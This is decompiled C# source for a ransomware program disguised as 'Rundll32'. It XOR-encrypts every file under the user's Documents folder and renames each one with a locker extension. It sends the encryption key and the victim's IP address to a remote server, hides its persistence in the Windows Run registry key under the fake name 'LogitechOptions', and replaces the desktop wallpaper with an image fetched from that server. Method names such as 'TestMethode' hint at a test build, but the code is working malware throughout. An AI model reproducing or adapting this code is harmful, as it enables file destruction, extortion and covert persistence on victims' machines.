using System;
using System.Collections.Generic;
using System.IO;
using System.Media;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Rundll32;

internal class Program
{
	private const string appName = "EventLogi";

	private static string phrasekey;

	private static string ip;

	private static List<string> worked = new List<string>();

	private static void Main(string[] args)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(".NET Assembly Running from commandline");
	}

	public static void TestMethode2()
	{
		SystemSounds.get_Beep().Play();
	}

	public static void TestMethode3()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(".NET Assembly Running from RundDLL32");
	}

	public static void TestMethode()
	{
		ip = Common.GetLocalIPv4();
		phrasekey = create_Key(Settings.PAS_SLEN_GTH);
		Common.clientlog(Settings.HOMEPAGE, ip, Settings.TESTCASE_LONG);
		Common.clientlog(Settings.HOMEPAGE, ip, "secret: " + phrasekey);
		workOnDir(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		Common.clientlog(Settings.HOMEPAGE, ip, Settings.TESTCASE_SHORT + " changed files: " + worked.Count);
		string localPath = new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath;
		addRunDL_ToStartupRegistry("LogitechOptions", localPath, "TestMethode");
		Common.clientlog(Settings.HOMEPAGE, ip, Settings.TESTCASE_SHORT + " pers added: 'LogitechOptions'");
		Wallpaper.Set(Settings.HOMEPAGE + "wallpaper?ip=" + ip, Wallpaper.Style.Stretched);
		Common.clientlog(Settings.HOMEPAGE, ip, Settings.TESTCASE_SHORT + " Wallpaper changed");
	}

	private static string create_Key(int length)
	{
		string text = "";
		Random random = new Random();
		while (text.Length != length)
		{
			text += "DerRosarotePanther&Freunde|Unsichtbarkeitsspray"[random.Next(0, "DerRosarotePanther&Freunde|Unsichtbarkeitsspray".Length)];
		}
		return text;
	}

	private static void workOnDir(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (!Settings.LOC_EXT.Contains(extension.ToLower()))
				{
					workOnFile(files[i]);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				workOnDir(directories[j]);
			}
		}
		catch
		{
		}
	}

	private static void workOnFile(string file)
	{
		try
		{
			byte[] array = File.ReadAllBytes(file);
			for (int i = 0; i < array.Length; i++)
			{
				array[i] ^= (byte)phrasekey[i % phrasekey.Length];
			}
			File.WriteAllBytes(file, array);
			File.Move(file, file + Settings.LOC_EXT);
			worked.Add(file);
		}
		catch
		{
		}
	}

	private static void addRunDL_ToStartupRegistry(string name, string path, string methodename)
	{
		try
		{
			string text = "SOFT@WA@RE\\@Mic@roso@ft\\Win@dows\\Cur@ren@tVer@sion\\R@un";
			Registry.CurrentUser.OpenSubKey(text.Replace("@", ""), writable: true)!.SetValue(name, "rundll32 \"" + path + "\", " + methodename);
		}
		catch
		{
		}
	}
}
